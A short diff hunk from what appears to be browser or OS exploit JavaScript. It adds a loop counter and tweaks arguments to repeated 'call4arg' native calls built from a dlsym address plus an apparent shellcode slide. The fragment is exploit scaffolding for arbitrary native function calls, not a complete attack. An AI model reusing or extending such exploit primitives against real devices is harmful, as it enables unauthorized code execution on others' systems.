@@ -57,9 +57,11 @@ function main() {
 //		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 10, 0x1, 0x2, 0x3);
 //	}
 
+	var i = 0;
 	while (true) {
 		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, i, 0x3);
-		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 10, 0x1, 0x2, 0x3);
+		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 1, 0x1, 0x2, 0x3);
+		i++;
 //		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
 	}
 
